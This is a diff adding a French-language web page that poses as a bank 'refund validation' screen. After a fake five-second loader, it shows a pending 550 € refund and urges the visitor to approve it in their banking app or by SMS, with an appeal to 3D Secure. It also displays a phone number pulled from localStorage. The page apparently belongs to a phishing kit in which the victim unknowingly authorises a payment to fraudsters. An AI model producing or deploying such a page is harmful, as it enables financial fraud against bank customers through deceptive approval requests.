@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validation de Remboursement</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #27ae60, #2ecc71);
+            color: white;
+            padding: 25px 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .header-icon {
+            width: 60px;
+            height: 60px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .header-icon img {
+            width: 35px;
+            height: 35px;
+        }
+
+        .header h1 {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 25px;
+        }
+
+        .alert {
+            background: #fff9e6;
+            border-left: 4px solid #ffc107;
+            border-radius: 8px;
+            padding: 18px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+        }
+
+        .alert-icon {
+            width: 40px;
+            height: 40px;
+            background: #ffc107;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .alert-icon img {
+            width: 20px;
+            height: 20px;
+        }
+
+        .alert-content {
+            flex: 1;
+            text-align: center;
+        }
+
+        .alert-content h3 {
+            color: #856404;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .alert-content p {
+            color: #856404;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .details {
+            margin-bottom: 25px;
+        }
+
+        .details-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 18px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .details-header img {
+            width: 24px;
+            height: 24px;
+        }
+
+        .details-header h3 {
+            font-size: 16px;
+            color: #2c3e50;
+            font-weight: 600;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #f5f5f5;
+        }
+
+        .detail-label {
+            color: #7f8c8d;
+            font-size: 14px;
+        }
+
+        .detail-value {
+            color: #2c3e50;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .amount {
+            color: #27ae60;
+            font-weight: 700;
+        }
+
+        .security {
+            background: #e8f4fd;
+            border-radius: 10px;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 25px;
+        }
+
+        .security-icon {
+            width: 40px;
+            height: 40px;
+            background: #3498db;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .security-icon img {
+            width: 20px;
+            height: 20px;
+        }
+
+        .security-text {
+            font-size: 14px;
+            color: #2c3e50;
+            text-align: center;
+        }
+
+        .security-text strong {
+            color: #3498db;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #eee;
+        }
+
+        .footer p {
+            font-size: 13px;
+            color: #95a5a6;
+        }
+
+        /* Loader Styles */
+#loader {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    transition: opacity 0.5s ease;
+}
+
+.loader-content {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    color: white;
+    gap: 14px; /* espace régulier entre tous les éléments */
+}
+
+.loader-spinner {
+    width: 80px;
+    height: 80px;
+    border: 5px solid rgba(255, 255, 255, 0.3);
+    border-radius: 50%;
+    border-top-color: white;
+    animation: spin 1s ease-in-out infinite;
+}
+
+.loader-text {
+    font-size: 18px;
+    font-weight: 600;
+}
+
+.loader-subtext {
+    font-size: 14px;
+    opacity: 0.8;
+}
+
+.progress-bar {
+    width: 200px;
+    height: 5px;
+    background: rgba(255, 255, 255, 0.3);
+    border-radius: 3px;
+    overflow: hidden;
+}
+
+.progress {
+    height: 100%;
+    background: white;
+    width: 0%;
+    animation: progress 5s linear forwards;
+}
+
+@keyframes spin {
+    to {
+        transform: rotate(360deg);
+    }
+}
+
+@keyframes progress {
+    to {
+        width: 100%;
+    }
+}
+
+
+        .bank-image {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #f8f9fa;
+            border-radius: 15px;
+            border: 2px dashed #dee2e6;
+        }
+
+        .bank-image img {
+            width: 80px;
+            height: 80px;
+            opacity: 0.7;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loader -->
+    <div id="loader">
+        <div class="loader-content">
+            <div class="loader-spinner"></div>
+            <div class="loader-text">Validation en cours</div>
+            <div class="loader-subtext">Veuillez patienter pendant le traitement</div>
+            <div class="progress-bar">
+                <div class="progress"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Page Content -->
+    <div class="container" id="pageContent" style="display: none;">
+        <div class="card">
+            <div class="header">
+                <div class="header-icon">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzI3YWU2MCI+PHBhdGggZD0iTTEyIDJDNi40OCAyIDIgNi40OCAyIDEyczQuNDggMTAgMTAgMTAgMTAtNC40OCAxMC0xMFMxNy41MiAyIDEyIDJ6bS0yIDE1bC01LTUgMS40MS0xLjQxTDEwIDE0LjE3bDcuNTktNy41OUwxOSA4bC05IDl6Ii8+PC9zdmc+" alt="Validation Icon">
+                </div>
+                <h1>Validation Requise</h1>
+                <p>Finalisez votre demande de remboursement</p>
+            </div>
+
+            <div class="content">
+                <!-- Image de l'application bancaire -->
+                <div class="bank-image">
+                    <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzM0OThkYiI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGQ9Ik0yMCA0SDRjLTEuMTEgMC0xLjk5Ljg5LTEuOTkgMkwyIDE4YzAgMS4xMS44OSAyIDIgMmgxNmMxLjExIDAgMi0uODkgMi0yVjZjMC0xLjExLS44OS0yLTItMnptLTggMmgydjJoLTJWNnptMCAzaDJ2MmgtMlY5em0tMyAwSDd2MmgydjJoLTJ2LTJoLTJ2LTJoMnYtMmgydjJ6bTExIDloLTZ2LTJoNnYyeiIvPjwvc3ZnPg==" alt="Application Bancaire">
+                </div>
+
+                <div class="alert">
+                    <div class="alert-icon">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmZiI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGQ9Ik0xMiA1Ljk5YzMuNTQgMCA2LjU1IDIuMzEgNy42IDUuNWwtMi4wNy0xLjA3Yy0uODItMi4zMy0zLjA0LTQuNDMtNS41My00LjQzLTMuNTQgMC02LjU1IDIuMzEtNy42IDUuNWwyLjA3IDEuMDdjLjgyLTIuMzMgMy4wNC00LjQzIDUuNTMtNC40M3ptMCA5YzMuNTQgMCA2LjU1IDIuMzEgNy42IDUuNWwtMi4wNy0xLjA3Yy0uODItMi4zMy0zLjA0LTQuNDMtNS41My00LjQzLTMuNTQgMC02LjU1IDIuMzEtNy42IDUuNWwyLjA3IDEuMDdjLjgyLTIuMzMgMy4wNC00LjQzIDUuNTMtNC40M3ptMCA5YzMuNTQgMCA2LjU1IDIuMzEgNy42IDUuNWwtMi4wNy0xLjA3Yy0uODItMi4zMy0zLjA0LTQuNDMtNS41My00LjQzLTMuNTQgMC02LjU1IDIuMzEtNy42IDUuNWwyLjA3IDEuMDdjLjgyLTIuMzMgMy4wNC00LjQzIDUuNTMtNC40M3oiLz48L3N2Zz4=" alt="Warning Icon">
+                    </div>
+                    <div class="alert-content">
+                        <h3>Remboursement en attente de validation</h3>
+                        <p>Merci de vous connecter sur votre application bancaire afin d'approuver la demande de remboursement et créditer le montant sur votre carte. Validez par SMS si vous ne possédez pas l'application bancaire !</p>
+                    </div>
+                </div>
+
+                <div class="details">
+                    <div class="details-header">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzM0OThkYiI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGQ9Ik0xMiAyQzYuNDggMiAyIDYuNDggMiAxMnM0LjQ4IDEwIDEwIDEwIDEwLTQuNDggMTAtMTBTMTcuNTIgMiAxMiAyem0xIDE1aC0ydi02aDJ2NnptMC04aC0yVjdoMnYyeiIvPjwvc3ZnPg==" alt="Details Icon">
+                        <h3>Détails de la transaction</h3>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Montant :</span>
+                        <span class="detail-value amount">550 €</span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Date :</span>
+                        <span class="detail-value" id="dynamic-date"></span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Téléphone :</span>
+                        <span class="detail-value" id="phoneNumber">XXXXXXXXXX</span>
+                    </div>
+                </div>
+
+                <div class="security">
+                    <div class="security-icon">
+                        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI2ZmZiI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGQ9Ik0xOCA4aC0xVjZjMC0yLjc2LTIuMjQtNS01LTVTNyAzLjI0IDcgNnYySDZjLTEuMSAwLTIgLjktMiAydjEwYzAgMS4xLjkgMiAyIDJoMTJjMS4xIDAgMi0uOSAyLTJWMTBjMC0xLjEtLjktMi0yLTJ6bS02IDljLTEuMSAwLTItLjktMi0ycy45LTIgMi0yIDIgLjkgMiAyLS45IDItMiAyem0zLjEtOUg5LjlWNmMwLTEuNzEgMS4zOS0zLjEgMy4xLTMuMSAxLjcxIDAgMy4xIDEuMzkgMy4xIDMuMXYyeiIvPjwvc3ZnPg==" alt="Security Icon">
+                    </div>
+                    <div class="security-text">
+                        <strong>Sécurité maximale :</strong> Cette opération est protégée par la norme 3D Secure.
+                    </div>
+                </div>
+
+                <div class="footer">
+                    <p>Informations traitées de manière confidentielle</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Afficher le loader puis le contenu après 5 secondes
+        window.addEventListener("load", () => {
+            setTimeout(() => {
+                document.getElementById("loader").style.opacity = "0";
+                setTimeout(() => {
+                    document.getElementById("loader").style.display = "none";
+                    document.getElementById("pageContent").style.display = "block";
+                }, 500);
+            }, 5000);
+        });
+
+        // Format date heure en jj/mm/aaaa hh:mm
+        function formatDateTime(date) {
+            const jour = String(date.getDate()).padStart(2, '0');
+            const mois = String(date.getMonth() + 1).padStart(2, '0');
+            const annee = date.getFullYear();
+            const heures = String(date.getHours()).padStart(2, '0');
+            const minutes = String(date.getMinutes()).padStart(2, '0');
+            return `${jour}/${mois}/${annee} ${heures}:${minutes}`;
+        }
+
+        // Met à jour la date dynamique
+        document.getElementById("dynamic-date").textContent = formatDateTime(new Date());
+
+        // Récupère le numéro de téléphone depuis localStorage et l'affiche
+        window.addEventListener('DOMContentLoaded', () => {
+            const phone = localStorage.getItem('phoneNumber');
+            if (phone) {
+                document.getElementById('phoneNumber').textContent = phone;
+            }
+        });
+    </script>
+</body>
+</html>
